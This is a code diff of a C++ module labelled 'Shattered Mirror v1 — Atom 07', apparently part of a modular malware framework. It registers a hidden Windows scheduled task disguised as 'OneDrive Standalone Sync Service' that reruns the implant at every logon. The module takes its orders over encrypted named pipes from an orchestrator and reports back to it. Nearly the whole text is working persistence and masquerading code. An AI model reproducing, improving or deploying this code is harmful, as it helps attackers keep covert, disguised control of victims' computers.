@@ -1,183 +1,193 @@
-﻿/*=============================================================================
- * Shattered Mirror v1 — Atom 07: COM Persistence
- *
- * Implements COM ITaskService to silently register a daily scheduled task
- * disguised as a Windows Update or OneDrive standalone updater.
+/*=============================================================================
+ * Shattered Mirror v1 — Atom 07: COM Task Persistence
  *===========================================================================*/
 
 #include "Atom_07_Persist.h"
 #include "../Orchestrator/AtomManager.h"
-#include <taskschd.h>
+#include "../Orchestrator/Config.h"
 #include <comdef.h>
-#include <cstring>
+#include <cstdio>
+#include <taskschd.h>
 
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsupp.lib")
 
-BOOL CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath) {
-    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    if (FAILED(hr)) return FALSE;
+HRESULT CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath) {
+  HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+  if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
+    return hr;
 
-    /* Security Initialization */
-    hr = CoInitializeSecurity(
-        NULL,
-        -1,
-        NULL,
-        NULL,
-        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
-        RPC_C_IMP_LEVEL_IMPERSONATE,
-        NULL,
-        0,
-        NULL);
-    
-    // Ignore RPC_E_TOO_LATE in case it was already setup by host process
-    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
-        CoUninitialize();
-        return FALSE;
-    }
+  hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+                            RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 
-    ITaskService *pService = NULL;
-    hr = CoCreateInstance(CLSID_TaskScheduler,
-                           NULL,
-                           CLSCTX_INPROC_SERVER,
-                           IID_ITaskService,
-                           (void**)&pService);  
-    if (FAILED(hr)) {
-        CoUninitialize();
-        return FALSE;
-    }
-
-    /* Connect to the task service */
-    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
-    if (FAILED(hr)) {
-        pService->Release();
-        CoUninitialize();
-        return FALSE;
-    }
-
-    /* Get the Root Task Folder */
-    ITaskFolder *pRootFolder = NULL;
-    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
-    if (FAILED(hr)) {
-        pService->Release();
-        CoUninitialize();
-        return FALSE;
-    }
-
-    /* If the task exists, delete it first to ensure update */
-    pRootFolder->DeleteTask(_bstr_t(pwszTaskName), 0);
-
-    /* Create the task builder object */
-    ITaskDefinition *pTask = NULL;
-    hr = pService->NewTask(0, &pTask);
-    
-    pService->Release();  
-    if (FAILED(hr)) {
-        pRootFolder->Release();
-        CoUninitialize();
-        return FALSE;
-    }
-
-    /* Setup Logon Trigger */
-    ITriggerCollection *pTriggerCollection = NULL;
-    hr = pTask->get_Triggers(&pTriggerCollection);
-    if (SUCCEEDED(hr)) {
-        ITrigger *pTrigger = NULL;
-        hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
-        if (SUCCEEDED(hr)) {
-            ILogonTrigger *pLogonTrigger = NULL;
-            hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
-            if (SUCCEEDED(hr)) {
-                // pLogonTrigger->put_UserId( (_bstr_t) L"DOMAIN\\User" ); 
-                pLogonTrigger->Release();
-            }
-            pTrigger->Release();
-        }
-        pTriggerCollection->Release();
-    }
-
-    /* Add an Action (Execute the payload) */
-    IActionCollection *pActionCollection = NULL;
-    hr = pTask->get_Actions(&pActionCollection);
-    if (SUCCEEDED(hr)) {
-        IAction *pAction = NULL;
-        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
-        if (SUCCEEDED(hr)) {
-            IExecAction *pExecAction = NULL;
-            hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
-            if (SUCCEEDED(hr)) {
-                pExecAction->put_Path(_bstr_t(pwszExecutablePath));
-                pExecAction->Release();
-            }
-            pAction->Release();
-        }
-        pActionCollection->Release();
-    }
-
-    /* Setup Settings (Hidden, Run with Highest Privileges if possible) */
-    IPrincipal *pPrincipal = NULL;
-    hr = pTask->get_Principal(&pPrincipal);
-    if (SUCCEEDED(hr)) {
-        pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
-        pPrincipal->put_RunLevel(TASK_RUNLEVEL_LUA); /* Fallback to Highest if admin */
-        pPrincipal->Release();
-    }
-
-    ITaskSettings *pSettings = NULL;
-    hr = pTask->get_Settings(&pSettings);
-    if (SUCCEEDED(hr)) {
-        pSettings->put_Hidden(VARIANT_TRUE);
-        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
-        pSettings->Release();
-    }
-
-    /* Save the task */
-    IRegisteredTask *pRegisteredTask = NULL;
-    hr = pRootFolder->RegisterTaskDefinition(
-            _bstr_t(pwszTaskName),
-            pTask,
-            TASK_CREATE_OR_UPDATE,
-            _variant_t(),
-            _variant_t(),
-            TASK_LOGON_INTERACTIVE_TOKEN,
-            _variant_t(L""),
-            &pRegisteredTask);
-
-    if (pRegisteredTask) pRegisteredTask->Release();
-    pRootFolder->Release();
-    pTask->Release();
+  if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
     CoUninitialize();
+    return hr;
+  }
 
-    return SUCCEEDED(hr);
+  ITaskService *pService = NULL;
+  hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
+                        IID_ITaskService, (void **)&pService);
+  if (FAILED(hr)) {
+    CoUninitialize();
+    return hr;
+  }
+
+  hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
+  if (FAILED(hr)) {
+    pService->Release();
+    CoUninitialize();
+    return hr;
+  }
+
+  ITaskFolder *pRootFolder = NULL;
+  hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
+  if (FAILED(hr)) {
+    pService->Release();
+    CoUninitialize();
+    return hr;
+  }
+
+  pRootFolder->DeleteTask(_bstr_t(pwszTaskName), 0);
+
+  ITaskDefinition *pTask = NULL;
+  hr = pService->NewTask(0, &pTask);
+  pService->Release();
+  if (FAILED(hr)) {
+    pRootFolder->Release();
+    CoUninitialize();
+    return hr;
+  }
+
+  ITriggerCollection *pTriggerCollection = NULL;
+  hr = pTask->get_Triggers(&pTriggerCollection);
+  if (SUCCEEDED(hr)) {
+    ITrigger *pTrigger = NULL;
+    hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
+    if (SUCCEEDED(hr)) {
+      ILogonTrigger *pLogonTrigger = NULL;
+      hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void **)&pLogonTrigger);
+      if (SUCCEEDED(hr)) {
+        pLogonTrigger->Release();
+      }
+      pTrigger->Release();
+    }
+    pTriggerCollection->Release();
+  }
+
+  IActionCollection *pActionCollection = NULL;
+  hr = pTask->get_Actions(&pActionCollection);
+  if (SUCCEEDED(hr)) {
+    IAction *pAction = NULL;
+    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
+    if (SUCCEEDED(hr)) {
+      IExecAction *pExecAction = NULL;
+      hr = pAction->QueryInterface(IID_IExecAction, (void **)&pExecAction);
+      if (SUCCEEDED(hr)) {
+        pExecAction->put_Path(_bstr_t(pwszExecutablePath));
+        pExecAction->Release();
+      }
+      pAction->Release();
+    }
+    pActionCollection->Release();
+  }
+
+  IPrincipal *pPrincipal = NULL;
+  hr = pTask->get_Principal(&pPrincipal);
+  if (SUCCEEDED(hr)) {
+    pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
+    pPrincipal->put_RunLevel(TASK_RUNLEVEL_LUA);
+    pPrincipal->Release();
+  }
+
+  ITaskSettings *pSettings = NULL;
+  hr = pTask->get_Settings(&pSettings);
+  if (SUCCEEDED(hr)) {
+    pSettings->put_Hidden(VARIANT_TRUE);
+    pSettings->put_StartWhenAvailable(VARIANT_TRUE);
+    pSettings->Release();
+  }
+
+  IRegisteredTask *pRegisteredTask = NULL;
+  hr = pRootFolder->RegisterTaskDefinition(
+      _bstr_t(pwszTaskName), pTask, TASK_CREATE_OR_UPDATE, _variant_t(),
+      _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""),
+      &pRegisteredTask);
+
+  if (pRegisteredTask)
+    pRegisteredTask->Release();
+  pRootFolder->Release();
+  pTask->Release();
+  CoUninitialize();
+
+  return hr;
 }
 
 DWORD WINAPI PersistenceAtomMain(LPVOID lpParam) {
-    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
-    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
-    if (!hPipe) return 1;
+  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
 
-    BYTE SharedSessionKey[] = "YiZZCxy3SLMsIdhN";
+  // 1. Connect to command pipe (receive commands)
+  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
+  if (!hCmdPipe)
+    return 1;
 
-    while (TRUE) {
-        IPC_MESSAGE inMsg = { 0 };
-        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
-            if (inMsg.CommandId == CMD_EXECUTE) {
-                WCHAR szMyPath[MAX_PATH] = { 0 };
-                GetModuleFileNameW(NULL, szMyPath, MAX_PATH);
+  // 2. Connect to report pipe (send reports)
+  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
+  if (!hReportPipe) {
+    CloseHandle(hCmdPipe);
+    return 1;
+  }
 
-                if (CreateScheduledTaskCOM(L"OneDrive Standalone Sync Service", szMyPath)) {
-                    char report[] = "[PERSIST] Scheduled Task COM Installation SUCCESS.";
-                    IPC_MESSAGE outMsg = { 0 };
-                    outMsg.CommandId = CMD_REPORT;
-                    outMsg.dwPayloadLen = (DWORD)strlen(report);
-                    memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
-                    IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
-                }
-            }
-        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
-            break;
+  BYTE SharedSessionKey[16];
+  memcpy(SharedSessionKey, Config::PSK_ID, 16);
+
+  // Send CMD_READY
+  IPC_MESSAGE readyMsg = {0};
+  readyMsg.dwSignature = 0x534D4952;
+  readyMsg.CommandId = CMD_READY;
+  readyMsg.AtomId = dwAtomId;
+  readyMsg.dwPayloadLen = 0;
+  IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
+
+  while (TRUE) {
+    DWORD dwAvail = 0;
+    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
+      IPC_MESSAGE inMsg = {0};
+      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
+        if (inMsg.CommandId == CMD_EXECUTE) {
+          WCHAR szMyPath[MAX_PATH] = {0};
+          GetModuleFileNameW(NULL, szMyPath, MAX_PATH);
+
+          HRESULT hrResult = CreateScheduledTaskCOM(L"OneDrive Standalone Sync Service", szMyPath);
+          if (SUCCEEDED(hrResult)) {
+            char report[] = "[PERSIST] Scheduled Task COM Installation SUCCESS.";
+            IPC_MESSAGE outMsg = {0};
+            outMsg.dwSignature = 0x534D4952;
+            outMsg.CommandId = CMD_REPORT;
+            outMsg.AtomId = dwAtomId;
+            outMsg.dwPayloadLen = (DWORD)strlen(report);
+            memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+            IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
+          } else {
+            char report[256];
+            sprintf_s(report, "[PERSIST] Scheduled Task COM Installation FAILED. HR: 0x%08X", hrResult);
+            IPC_MESSAGE outMsg = {0};
+            outMsg.dwSignature = 0x534D4952;
+            outMsg.CommandId = CMD_REPORT;
+            outMsg.AtomId = dwAtomId;
+            outMsg.dwPayloadLen = (DWORD)strlen(report);
+            memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+            IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
+          }
+        } else if (inMsg.CommandId == CMD_TERMINATE) {
+          break;
         }
-        Sleep(1000);
+      }
     }
-    return 0;
+    Sleep(100);
+  }
+
+  CloseHandle(hCmdPipe);
+  CloseHandle(hReportPipe);
+  return 0;
 }
